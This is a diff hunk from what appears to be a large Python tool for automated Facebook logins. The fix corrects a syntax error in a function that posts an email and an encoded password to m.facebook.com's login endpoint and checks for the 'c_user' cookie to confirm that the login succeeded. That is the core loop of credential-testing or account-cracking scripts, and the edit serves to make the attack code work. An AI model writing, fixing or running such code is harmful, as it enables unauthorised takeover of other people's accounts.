@@ -1232,7 +1232,7 @@ def m6(idf,pwv):
             'email': idf,
             'login_source': 'comet_headerless_login',
             'next': 'https://m.facebook.com/login/device-based/regular/login',
-            'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),ps,} 
+            'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),ps,)} 
    lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
